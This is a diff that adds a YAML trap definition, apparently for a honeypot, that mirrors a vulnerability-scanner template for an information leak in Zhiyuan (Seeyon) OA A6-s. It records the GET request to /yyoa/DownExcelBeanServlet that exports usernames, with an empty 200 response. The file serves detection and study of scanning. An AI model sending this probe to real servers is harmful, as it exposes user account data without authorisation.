@@ -1,0 +1,21 @@
+id: zhiyuan-oa-info-leak
+info:
+  name: Zhiyuan Oa A6-s info Leak
+  author: pikpikcu
+  description: null
+  severity: info
+  reference:
+  - https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3351.md
+  metadata:
+    max-request: 1
+  tags: zhiyuan,leak,disclosure,seeyon
+traps:
+- request:
+    method: GET
+    path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
